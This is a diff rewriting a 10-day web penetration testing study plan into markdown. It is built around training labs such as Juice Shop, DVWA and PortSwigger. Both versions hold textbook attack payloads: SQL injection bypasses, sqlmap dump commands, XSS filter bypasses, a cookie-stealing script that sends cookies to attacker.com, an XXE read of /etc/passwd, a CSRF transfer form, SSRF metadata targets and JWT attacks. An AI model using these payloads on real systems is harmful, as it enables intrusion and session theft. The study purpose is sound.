@@ -1,622 +1,597 @@
-10-Day Web Application Penetration Testing Study Plan
+# 🌐 10-Day Web Application Penetration Testing Mastery Routine
 
-Here's a comprehensive roadmap taking you from basics to advanced practical skills, designed for someone with your cybersecurity background.
-Daily Structure (4-5 hours/day)
+**Target Audience:** **Intermediate** pentesters (Burp Suite + Linux comfort required)
+**Study Time:** 4-5 hours per day
+**Real-world focus:** OWASP Top 10 + 150+ labs + professional reporting[^1]
 
-    Theory & Concepts: 1.5 hours
+***
 
-    Hands-on Labs: 2-3 hours
+## Table of Contents
 
-    Practice & Review: 1 hour
+- [Pre-Day 0: Essential Tools Setup](#pre-day-0-essential-tools-setup)
+- [Day 1: Foundations \& HTTP Protocol](#day-1-foundations--http-protocol)
+- [Day 2: Information Gathering \& Reconnaissance](#day-2-information-gathering--reconnaissance)
+- [Day 3: OWASP Top 10 - SQL Injection](#day-3-owasp-top-10--sql-injection)
+- [Day 4: OWASP Top 10 - Cross-Site Scripting](#day-4-owasp-top-10--cross-site-scripting)
+- [Day 5: Authentication \& Session Management](#day-5-authentication--session-management)
+- [Day 6: OWASP Top 10 - IDOR \& Access Control](#day-6-owasp-top-10--idor--access-control)
+- [Day 7: CSRF, SSRF \& XXE](#day-7-csrf-ssrf--xxe)
+- [Day 8: API Security Testing](#day-8-api-security-testing)
+- [Day 9: Advanced Topics \& Tool Mastery](#day-9-advanced-topics--tool-mastery)
+- [Day 10: Methodology, Reporting \& CTF](#day-10-methodology-reporting--ctf)
 
-Day 1: Foundations & HTTP Protocol
-Theory (1.5 hours)
+***
 
-Topics:
+## Pre-Day 0: Essential Tools Setup
 
-    Web application architecture (client-server model, HTTP/HTTPS)
+**Time Required:** 2-3 hours
 
-    HTTP methods (GET, POST, PUT, DELETE, PATCH)
+### Environment Setup
 
-    Request/response structure (headers, body, status codes)
+```bash
+# Reconnaissance Tools
+sudo apt install subfinder amass httpx gobuster ffuf whatweb nikto
 
-    Cookies, sessions, and authentication mechanisms
-
-    ​
-
-Resources:
-
-    MDN Web Docs: HTTP Overview - https://developer.mozilla.org/en-US/docs/Web/HTTP
-
-    PortSwigger Web Security Academy: HTTP basics - https://portswigger.net/web-security/learning-paths
-
-Practical (2-3 hours)
-
-Setup:
-
-    Install Burp Suite Community Edition
-
-    Configure browser proxy (FoxyProxy)
-
-    Set up OWASP Juice Shop locally:
-
-bash
+# Vulnerable Applications (Docker)
 docker pull bkimminich/juice-shop
-docker run -d -p 3000:3000 bkimminich/juice-shop
-
-Exercises:
-
-    Intercept HTTP traffic with Burp Proxy
-
-    Analyze request/response structures
-
-    Modify cookies and headers using Burp Repeater
-
-    Complete Juice Shop challenges: "Score Board" and "Privacy Policy"
-
-    ​
-
-Resources:
-
-    Burp Suite documentation: https://portswigger.net/burp/documentation
-
-    OWASP Juice Shop: https://github.com/juice-shop/juice-shop
-
-Day 2: Information Gathering & Reconnaissance
-Theory (1.5 hours)
-
-Topics:
-
-    Passive reconnaissance (OSINT, DNS enumeration, subdomain discovery)
-
-    Active reconnaissance (port scanning, service fingerprinting)
-
-    Technology stack identification
-
-    Mapping attack surface
-
-    ​
-
-Resources:
-
-    OWASP Testing Guide - Information Gathering: https://owasp.org/www-project-web-security-testing-guide/
-
-    HackerSploit YouTube: Web App Recon
-
-Practical (2-3 hours)
-
-Tools:
-
-bash
-# Subdomain enumeration
-subfinder -d target.com
-amass enum -d target.com
-
-# Technology fingerprinting
-whatweb target.com
-wappalyzer (browser extension)
-
-# Directory/file discovery
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-
-Exercises:
-
-    Perform reconnaissance on Juice Shop
-
-    Map out the application structure
-
-    Identify technologies used (view source, Wappalyzer)
-
-    Discover hidden endpoints with Gobuster
-
-    Complete Juice Shop: "Exposed Metrics" challenge
-
-    ​
-
-Day 3: OWASP Top 10 - Injection Attacks (SQL Injection)
-Theory (1.5 hours)
-
-Topics:
-
-    SQL Injection principles and types (Classic, Blind, Time-based)
-
-    Authentication bypass techniques
-
-    Data extraction methods
-
-    SQLMap automation
-
-    ​
-
-Resources:
-
-    PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
-
-    OWASP SQL Injection Guide
-
-    PentesterLab SQL Injection series
-
-Practical (2-3 hours)
-
-Manual Testing:
-
-sql
-# Test for SQL injection
-' OR '1'='1
-admin' --
-' OR '1'='1' -- -
-
-# Union-based extraction
-' UNION SELECT NULL, NULL--
-' UNION SELECT username, password FROM users--
-
-Automated Testing:
-
-bash
-# SQLMap
-sqlmap -u "http://target.com/page?id=1" --dbs
-sqlmap -u "http://target.com/page?id=1" -D database --tables
-sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
-
-Labs:
-
-    PortSwigger SQL Injection Labs (5-6 labs)
-
-    DVWA SQL Injection (Low, Medium, High)
-
-    Juice Shop: "Login Admin" and "User Credentials" challenges
-
-    ​
-
-Resources:
-
-    DVWA: https://github.com/digininja/DVWA
-
-    PortSwigger Labs: https://portswigger.net/web-security/all-labs
-
-Day 4: OWASP Top 10 - Cross-Site Scripting (XSS)
-Theory (1.5 hours)
-
-Topics:
-
-    XSS types: Reflected, Stored, DOM-based
-
-    JavaScript payloads and encoding
-
-    XSS exploitation techniques (cookie stealing, keylogging)
-
-    Bypassing filters and WAFs
-
-    ​
-
-Resources:
-
-    PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
-
-    OWASP XSS Guide
-
-    XSS Game by Google: https://xss-game.appspot.com/
-
-Practical (2-3 hours)
-
-Payloads:
-
-javascript
-# Basic XSS
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-
-# Cookie stealing
-<script>document.location='http://attacker.com/?c='+document.cookie</script>
-
-# Filter bypass
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<svg/onload=alert(1)>
-
-Labs:
-
-    PortSwigger XSS Labs (8-10 labs)
-
-    DVWA XSS (Reflected, Stored)
-
-    Juice Shop: "DOM XSS", "Reflected XSS", "Bonus Payload" challenges
-
-    ​
-
-    XSS Game levels 1-6
-
-Resources:
-
-    XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-
-Day 5: Authentication & Session Management Flaws
-Theory (1.5 hours)
-
-Topics:
-
-    Authentication bypass techniques
-
-    Session fixation and hijacking
-
-    Password reset vulnerabilities
-
-    JWT token attacks
-
-    Multi-factor authentication bypass
-
-    ​
-
-Resources:
-
-    PortSwigger Authentication: https://portswigger.net/web-security/authentication
-
-    OWASP Authentication Cheat Sheet
-
-    JWT.io: Understanding JSON Web Tokens
-
-Practical (2-3 hours)
-
-Testing Techniques:
-
-bash
-# Session analysis with Burp Sequencer
-# Cookie manipulation
-# JWT decoding and tampering
-jwt_tool token.jwt -T
-
-# Password reset token analysis
-# OTP bypass attempts
-
-Labs:
-
-    PortSwigger Authentication Labs (10-12 labs including 2FA bypass)
-
-    Practice OTP bypass from your earlier mainframe testing experience
-
-    Juice Shop: "Login Bender", "Reset Bjoern's Password", "Login Jim"
-
-    ​
-
-Resources:
-
-    JWT_Tool: https://github.com/ticarpi/jwt_tool
-
-Day 6: OWASP Top 10 - IDOR & Access Control
-Theory (1.5 hours)
-
-Topics:
-
-    Insecure Direct Object References (IDOR)
-
-    Horizontal and vertical privilege escalation
-
-    Broken access control patterns
-
-    Testing methodology
-
-    ​
-
-Resources:
-
-    PortSwigger Access Control: https://portswigger.net/web-security/access-control
-
-    OWASP Broken Access Control
-
-Practical (2-3 hours)
-
-Testing Approach:
-
-text
-1. Map all endpoints and parameters
-2. Test with different user roles
-3. Modify IDs, UUIDs, tokens
-4. Test for horizontal/vertical escalation
-
-Labs:
-
-    PortSwigger Access Control Labs (10+ labs)
-
-    DVWA Insecure CAPTCHA
-
-    Juice Shop: "View Basket", "Forged Coupon", "Manipulate Basket"
-
-    ​
-
-Day 7: CSRF, SSRF & XXE
-Theory (1.5 hours)
-
-Topics:
-
-    Cross-Site Request Forgery (CSRF) attacks
-
-    Server-Side Request Forgery (SSRF)
-
-    XML External Entity (XXE) injection
-
-    File upload vulnerabilities
-
-    ​
-
-Resources:
-
-    PortSwigger CSRF, SSRF, XXE modules
-
-    OWASP guides for each vulnerability type
-
-Practical (2-3 hours)
-
-CSRF PoC:
-
-xml
-<form action="https://target.com/transfer" method="POST">
-  <input type="hidden" name="to" value="attacker">
-  <input type="hidden" name="amount" value="1000">
-</form>
-<script>document.forms[0].submit();</script>
-
-XXE Payload:
-
-xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<data>&xxe;</data>
-
-Labs:
-
-    PortSwigger CSRF, SSRF, XXE Labs
-
-    DVWA CSRF, File Upload
-
-    Juice Shop: "CSRF", "XXE Data Access"
-
-    ​
-
-Day 8: API Security Testing
-Theory (1.5 hours)
-
-Topics:
-
-    REST API structure and authentication
-
-    API enumeration and testing
-
-    GraphQL injection
-
-    API rate limiting and abuse
-
-    OWASP API Security Top 10
-
-    ​
-
-Resources:
-
-    OWASP API Security Top 10: https://owasp.org/API-Security/
-
-    PortSwigger API Testing
-
-    REST API Pentesting Guide
-
-Practical (2-3 hours)
-
-Setup:
-
-bash
-# Install VAmPI (Vulnerable API)
-docker run -p 5000:5000 erev0s/vampi
-
-Testing:
-
-bash
-# API enumeration
-curl -X GET http://target.com/api/users
-curl -X POST http://target.com/api/login -d '{"user":"admin","pass":"admin"}'
-
-# Burp Intruder for API fuzzing
-# Test authentication endpoints
-# Enumerate object IDs
-
-Labs:
-
-    VAmPI challenges
-
-    ​
-
-    PortSwigger API Labs
-
-    Juice Shop API-related challenges
-
-Resources:
-
-    VAmPI: https://github.com/erev0s/VAmPI
-
-    Postman for API testing
-
-Day 9: Advanced Topics & Tool Mastery
-Theory (1.5 hours)
-
-Topics:
-
-    Deserialization attacks
-
-    Race conditions
-
-    Business logic flaws
-
-    WebSockets security
-
-    Advanced Burp Suite features (Macros, Extensions)
-
-    ​
-
-Resources:
-
-    PortSwigger Advanced Topics
-
-    Burp Suite Extensions: Logger++, Autorize, Active Scan++
-
-Practical (2-3 hours)
-
-Burp Extensions:
-
-text
-Install via BApp Store:
-- Autorize (for access control testing)
-- Logger++ (advanced logging)
-- Param Miner (for parameter discovery)
-- Turbo Intruder (for race conditions)
-
-Advanced Labs:
-
-    PortSwigger Insecure Deserialization Labs
-
-    Race Condition Labs
-
-    Business Logic Vulnerability Labs
-
-    Web Goat advanced modules
-
-    ​
-
-Resources:
-
-    Web Goat: https://github.com/WebGoat/WebGoat
-
-Day 10: Methodology, Reporting & CTF Practice
-Theory (1.5 hours)
-
-Topics:
-
-    Complete penetration testing methodology
-
-    ​
-
-    Report writing and vulnerability classification (CVSS)
-
-    Remediation recommendations
-
-    Bug bounty best practices
-
-Resources:
-
-    OWASP WSTG (Web Security Testing Guide): https://owasp.org/www-project-web-security-testing-guide/
-
-    Bug Bounty Bootcamp book
-
-    Sample penetration testing reports
-
-Practical (2-3 hours)
-
-Full Assessment:
-
-    Complete a full pentest on OWASP Mutillidae II
-
-    ​
-
-    Document all findings
-
-    Write a professional report
-
-CTF Practice:
-
-    Try HackTheBox web challenges (5-6 easy boxes)
-
-    PentesterLab exercises
-
-    Finish remaining Juice Shop challenges
-
-Resources:
-
-    OWASP Mutillidae II: https://github.com/webpwnized/mutillidae
-
-    HackTheBox: https://www.hackthebox.com/
-
-    PentesterLab: https://pentesterlab.com/
-
-Essential Tools Setup (Day 0 or throughout)
-Required Tools:
-
-bash
-# Core tools
-- Burp Suite Community/Professional
-- OWASP ZAP (alternative)[web:199][web:204]
-- Firefox/Chrome with extensions (FoxyProxy, Wappalyzer, Cookie Editor)
-
-# Reconnaissance
-- subfinder, amass, gobuster, ffuf, nikto
-
-# Testing
-- sqlmap, jwt_tool, nuclei, wpscan
-
-# Docker containers
-- OWASP Juice Shop[web:203]
-- DVWA[web:203]
-- VAmPI[web:203]
-- Mutillidae II[web:203]
-- WebGoat[web:203]
-
-Installation Script:
-
-bash
-# Install vulnerable apps
-docker pull bkimminich/juice-shop
-docker pull vulnerables/web-dvwa
+docker pull vulnerables/web-dvwa  
 docker pull erev0s/vampi
 docker pull webpwnized/mutillidae
 
-Supplementary Resources
-Video Channels:
-
-    Rana Khalil (PortSwigger Labs walkthroughs)
-
-    LiveOverflow
-
-    PwnFunction
-
-    HackerSploit
-
-Books:
-
-    "The Web Application Hacker's Handbook" (classic)
-
-    "Bug Bounty Bootcamp" by Vickie Li
-
-    "Real-World Bug Hunting" by Peter Yaworski
-
-Practice Platforms:
-
-    PortSwigger Web Security Academy (free)
-
-    ​
-
-    PentesterLab (paid/free tiers)
-
-    HackTheBox (web challenges)
-
-    TryHackMe (web application rooms)
-
-Certifications (Post-study):
-
-    BSCP (Burp Suite Certified Practitioner)
-
-    eWPT (eLearnSecurity Web Penetration Tester)
-
-    OSWE (Offensive Security Web Expert)
+# Burp Suite + Extensions
+sudo snap install burpsuite-community
+# FoxyProxy, Wappalyzer, Cookie Editor, HackTools
+```
 
 
-Daily Progress Tracker
+### Essential Accounts
 
-Create a checklist:
+- **PortSwigger Web Academy**: 200+ FREE labs[^1]
+- **HackTheBox**: Starting Point (web machines)
+- **TryHackMe**: Web Fundamentals path
+- **PentesterLab**: Free bootstrap exercises
 
-text
-Day 1: ☐ HTTP basics ☐ Burp setup ☐ 5 Juice Shop challenges
-Day 2: ☐ Recon tools ☐ Subdomain enum ☐ Directory brute-force
-Day 3: ☐ SQL theory ☐ 5 SQLi labs ☐ SQLMap practice
-Day 4: ☐ XSS types ☐ 8 XSS labs ☐ Cookie stealing
-Day 5: ☐ Auth bypass ☐ 10 auth labs ☐ JWT attacks
-Day 6: ☐ IDOR ☐ 10 access control labs
-Day 7: ☐ CSRF/SSRF/XXE ☐ 6 labs each
-Day 8: ☐ API Top 10 ☐ VAmPI ☐ API fuzzing
-Day 9: ☐ Advanced topics ☐ Burp extensions ☐ Race conditions
-Day 10: ☐ Full assessment ☐ Report ☐ CTF practice
+***
 
-This roadmap provides a structured path from fundamentals to advanced practical skills, emphasizing hands-on learning with vulnerable applications while building a strong theoretical foundation
+## Day 1: Foundations \& HTTP Protocol
+
+**Study Time:** 4-5 hours
+
+### Morning: HTTP Protocol Deep Dive (2 hours)
+
+#### Core Components
+
+```
+Client (Browser) → Proxy (Burp) → Server (Apache/Nginx)
+     ↓
+Request: Method + Headers + Body    Response: Status + Headers + Body
+```
+
+**HTTP Methods Impact:**
+
+
+| Method | Safe | Idempotent | Use Case |
+| :-- | :-- | :-- | :-- |
+| **GET** | ✅ | ✅ | Read data |
+| **POST** | ❌ | ❌ | Create data |
+| **PUT** | ❌ | ✅ | Update data |
+| **DELETE** | ❌ | ✅ | Remove data |
+
+### Afternoon: Burp Suite Mastery (3 hours)
+
+#### Traffic Interception \& Manipulation
+
+```bash
+# Launch Juice Shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+
+# Burp Configuration
+1. FoxyProxy → 127.0.0.1:8080
+2. Target → http://localhost:3000
+3. Intercept → Analyze → Forward
+```
+
+**Key Exercises:**
+
+- **Proxy**: Intercept login requests
+- **Repeater**: Cookie/header manipulation
+- **Intruder**: Parameter fuzzing
+
+
+### Practical Lab
+
+- Juice Shop: "Score Board", "Privacy Policy", "Exposed Metrics"
+- PortSwigger: HTTP basics (5 labs)
+
+
+### Today's Checklist
+
+- [ ] Burp Suite + FoxyProxy configured
+- [ ] HTTP methods + headers mastered
+- [ ] 5 Juice Shop challenges complete
+- [ ] PortSwigger HTTP labs finished
+
+***
+
+## Day 2: Information Gathering \& Reconnaissance
+
+**Study Time:** 4-5 hours
+
+### Morning: Passive Reconnaissance (2 hours)
+
+#### Subdomain \& Asset Discovery
+
+```bash
+# Passive subdomain enum
+subfinder -d target.com -all -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+cat subs.txt amass.txt | sort -u | httpx -silent -o live.txt
+```
+
+
+#### Historical Attack Surface
+
+```bash
+echo "target.com" | waybackurls | tee wayback.txt
+echo "target.com" | gau --blacklist png,jpg,css | tee gau.txt
+cat wayback.txt gau.txt | grep "?" | uro | tee params.txt
+```
+
+
+### Afternoon: Active Enumeration (3 hours)
+
+#### Directory \& Parameter Fuzzing
+
+```bash
+# Intelligent directory brute-force
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -u https://target.com/FUZZ -mc 200,301,302,307 -o ffuf.json
+
+# Parameter discovery
+ffuf -w params.txt -u "https://target.com/page?FUZZ=test"
+```
+
+
+#### Technology Fingerprinting
+
+```bash
+whatweb -v https://target.com
+# Apache/2.4.41 + PHP/7.4.3 + jQuery/3.5.1
+```
+
+
+### Practical Lab
+
+- Juice Shop: Complete recon mapping
+- PortSwigger: Information Disclosure (5 labs)
+
+
+### Today's Checklist
+
+- [ ] 500+ subdomains enumerated
+- [ ] 10k+ historical URLs discovered
+- [ ] Technology stack fingerprinted
+- [ ] Hidden directories/parameters found
+
+***
+
+## Day 3: OWASP Top 10 - SQL Injection
+
+**Study Time:** 4-5 hours
+
+### Morning: SQL Injection Fundamentals (2 hours)
+
+#### Attack Vectors \& Types
+
+| Type | Detection | Exploitation |
+| :-- | :-- | :-- |
+| **Error-based** | MySQL/PostgreSQL errors | Direct data dump |
+| **Union-based** | `ORDER BY` + `UNION SELECT` | Table/column enum |
+| **Blind Boolean** | `AND 1=1` vs `AND 1=2` | Bit-by-bit extraction |
+| **Blind Time** | `SLEEP(5)` | Timing analysis |
+
+### Afternoon: Manual + Automated Exploitation (3 hours)
+
+#### Manual Testing Payloads
+
+```text
+# Authentication bypass
+' OR '1'='1 --
+admin' --
+
+# Union extraction  
+' UNION SELECT NULL, NULL--
+' UNION SELECT username, password FROM users--
+```
+
+
+#### SQLMap Automation
+
+```bash
+sqlmap -u "http://target.com/search?q=1" --dbs --batch
+sqlmap -u "http://target.com/search?q=1" -D juice --tables --dump
+```
+
+
+### Practical Lab
+
+- **PortSwigger**: SQLi Labs (18 total)
+- **DVWA**: SQL Injection (Low/Medium/High/Impossible)
+- **Juice Shop**: "Login Admin", "User Credentials"
+
+
+### Today's Checklist
+
+- [ ] Manual SQLi detection (4 types)
+- [ ] SQLMap full database dump
+- [ ] 10+ PortSwigger SQLi labs
+- [ ] Authentication bypass chains
+
+***
+
+## Day 4: OWASP Top 10 - Cross-Site Scripting
+
+**Study Time:** 4-5 hours
+
+### Morning: XSS Attack Vectors (2 hours)
+
+#### XSS Types Matrix
+
+| Type | Storage | Execution Context | Example |
+| :-- | :-- | :-- | :-- |
+| **Reflected** | No | URL Parameter | `search?q=<script>alert(1)</script>` |
+| **Stored** | Yes | Persistent | Profile bio injection |
+| **DOM-based** | No | Client-side JS | `page#<img src=x onerror=alert(1)>` |
+
+### Afternoon: Payloads \& Bypasses (3 hours)
+
+#### Essential Payloads
+
+```html
+<!-- Basic -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+<!-- Advanced bypasses -->
+<svg onload=alert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+javascript:alert(1)
+```
+
+
+#### Cookie Theft Exploitation
+
+```javascript
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
+
+
+### Practical Lab
+
+- **PortSwigger**: XSS Labs (30+ total)
+- **DVWA**: XSS (Reflected/Stored)
+- **Juice Shop**: "DOM XSS", "Bonus Payload"
+- **XSS Game**: Levels 1-6
+
+
+### Today's Checklist
+
+- [ ] 3 XSS types exploited
+- [ ] 10+ filter bypass techniques
+- [ ] Cookie stealing PoC working
+- [ ] 15+ PortSwigger XSS labs
+
+***
+
+## Day 5: Authentication \& Session Management
+
+**Study Time:** 4-5 hours
+
+### Morning: Authentication Bypass Vectors (2 hours)
+
+#### Attack Surface Mapping
+
+```
+Login Forms → Password Reset → Session Tokens → 2FA → Remember Me
+```
+
+
+### Afternoon: Exploitation Techniques (3 hours)
+
+#### JWT Attacks
+
+```bash
+git clone https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py eyJhbGciOiJub25... -T  # None algorithm
+python3 jwt_tool.py token -C -d rockyou.txt  # Secret brute-force
+```
+
+
+#### Session Testing
+
+```
+Burp Sequencer → Entropy analysis → Predictable session IDs
+Cookie parameter pollution → Session confusion
+```
+
+
+### Practical Lab
+
+- **PortSwigger**: Authentication (15 labs)
+- **Juice Shop**: "Login Bender", "JWT Issues"
+
+
+### Today's Checklist
+
+- [ ] JWT none algorithm bypass
+- [ ] Session fixation discovered
+- [ ] 12+ authentication labs
+
+***
+
+## Day 6: OWASP Top 10 - IDOR \& Access Control
+
+**Study Time:** 4-5 hours
+
+### Morning: IDOR Detection Patterns (2 hours)
+
+#### Parameter Manipulation
+
+```text
+/user/123 → /user/124 (Horizontal IDOR)
+UUID: 550e8400-e29b... → Sequential increment
+Base64: dXNlcjEyMw== → user123 decoded
+```
+
+
+### Afternoon: Access Control Testing (3 hours)
+
+#### Methodology
+
+```
+1. Map ALL ID parameters (GET/POST/JSON)
+2. Test sequential/incremental IDs  
+3. UUID prediction/enumeration
+4. Role-based access (user vs admin)
+```
+
+
+### Practical Lab
+
+- **PortSwigger**: Access Control (13 labs)
+- **Juice Shop**: "View Basket", "Admin Registration"
+
+
+### Today's Checklist
+
+- [ ] 5+ IDOR endpoints discovered
+- [ ] Horizontal/vertical escalation
+- [ ] Parameter pollution attacks
+
+***
+
+## Day 7: CSRF, SSRF \& XXE
+
+**Study Time:** 4-5 hours
+
+### Morning: Server-Side Attacks (2 hours)
+
+#### SSRF Attack Chains
+
+```text
+127.0.0.1:8080/admin → localhost bypass
+169.254.169.254/metadata → AWS IMDSv1
+0.0.0.0:22 → Internal SSH pivot
+```
+
+
+#### XXE Payloads
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+```
+
+
+### Afternoon: Exploitation (3 hours)
+
+**CSRF PoC Generator:**
+
+```html
+<form action="https://target.com/transfer" method="POST">
+<input type="hidden" name="to" value="attacker">
+<input type="hidden" name="amount" value="1000">
+</form><script>document.forms[^0].submit();</script>
+```
+
+
+### Practical Lab
+
+- **PortSwigger**: CSRF (7 labs), SSRF (7 labs), XXE (9 labs)
+
+
+### Today's Checklist
+
+- [ ] SSRF internal pivot achieved
+- [ ] XXE file disclosure working
+- [ ] CSRF PoC exploitation
+
+***
+
+## Day 8: API Security Testing
+
+**Study Time:** 4-5 hours
+
+### Morning: OWASP API Top 10 (2 hours)
+
+#### Critical Risks
+
+| \# | Risk | Attack Vector |
+| :-- | :-- | :-- |
+| 1 | **BOLA/IDOR** | Object-level authorization |
+| 2 | **Broken Auth** | JWT/MFA bypass |
+| 5 | **BOLA Function** | Mass assignment |
+
+### Afternoon: API Exploitation (3 hours)
+
+#### VAmPI Vulnerable API
+
+```bash
+docker run -d -p 5000:5000 erev0s/vampi
+curl -X POST http://localhost:5000/api/users \
+  -d '{"id":123,"admin":true}'  # Mass assignment
+```
+
+
+### Practical Lab
+
+- **VAmPI**: Complete API challenges
+- **PortSwigger**: API testing labs
+
+
+### Today's Checklist
+
+- [ ] API enumeration complete
+- [ ] BOLA/IDOR exploitation
+- [ ] Mass assignment attacks
+
+***
+
+## Day 9: Advanced Topics \& Tool Mastery
+
+**Study Time:** 4-5 hours
+
+### Morning: Burp Extensions (2 hours)
+
+#### Essential Extensions
+
+```
+Autorize → Access control testing
+Logger++ → Advanced logging  
+Param Miner → Hidden parameter discovery
+Turbo Intruder → Race conditions
+```
+
+
+### Afternoon: Advanced Exploitation (3 hours)
+
+#### Race Conditions
+
+```python
+import requests, threading
+def race(): requests.post('http://target.com/transfer', data={'amount':1000})
+threads = [threading.Thread(target=race) for _ in range(100)]
+```
+
+
+### Practical Lab
+
+- **PortSwigger**: Deserialization + Race Condition labs
+
+
+### Today's Checklist
+
+- [ ] Burp extensions configured
+- [ ] Race condition exploitation
+- [ ] Advanced Burp workflows
+
+***
+
+## Day 10: Methodology, Reporting \& CTF
+
+**Study Time:** 4-5 hours
+
+### Morning: Professional Reporting (2 hours)
+
+#### CVSS Scoring Template
+
+| Vulnerability | CVSS v3.1 | Impact | Proof |
+| :-- | :-- | :-- | :-- |
+| SQL Injection | **9.8** | RCE | Screenshot |
+| Stored XSS | **6.1** | Account takeover | Video |
+| IDOR | **8.1** | Data exposure | Request |
+
+### Afternoon: Full Assessment (3 hours)
+
+**Complete Engagement:**
+
+- **Mutillidae II**: Full black-box pentest
+- **Professional Report**: 20-page PDF
+- **CTF Practice**: HTB web boxes
+
+
+### Today's Checklist
+
+- [ ] Complete pentest report written
+- [ ] CVSS scoring mastered
+- [ ] Executive summary + remediation
+- [ ] Portfolio-ready GitHub repo
+
+***
+
+## Essential Resources Library
+
+### Tools Repository
+
+```bash
+git clone https://github.com/danielmiessler/SecLists     # Wordlists
+git clone https://github.com/ticarpi/jwt_tool           # JWT attacks
+git clone https://github.com/projectdiscovery/nuclei    # Vulnerability scanner
+```
+
+
+### Reading Materials
+
+- **PortSwigger Web Academy**: 200+ FREE labs[^1]
+- **OWASP Testing Guide v4.2**
+- **"The Web Application Hacker's Handbook"**
+
+
+### Video Channels
+
+- **Rana Khalil** (PortSwigger walkthroughs)
+- **IppSec** (HTB web machines)
+- **HackerSploit** (Tool tutorials)
+
+
+### Communities
+
+- **Reddit**: r/netsec, r/bugbounty
+- **Discord**: HackTheBox, PortSwigger
+
+***
+
+## Progress Tracker
+
+### Daily Checklist Template
+
+```markdown
+## Day X: [Topic]
+
+### Learning Objectives
+- [ ] Theory & concepts mastered
+- [ ] Hands-on labs completed  
+- [ ] PortSwigger challenges solved
+
+### Practical Labs
+- [ ] Juice Shop: X challenges
+- [ ] DVWA: All levels
+- [ ] PortSwigger: Y labs
+
+### Key Takeaways
+-
+```
+
+
+***
+
+**Total Labs:** 150+ PortSwigger + Juice Shop (50+) + DVWA + VAmPI
+**Certification Path:** **BSCP** → **eWPT** → **OSWE**
+**Portfolio Value:** Professional pentester ready (\$80k+ entry-level)[^1]
+
+**Intermediate pentester → Professional in 10 days** 🚀💻
+
+<div align="center">⁂</div>
+
+[^1]: https://portswigger.net/web-security/all-labs
+
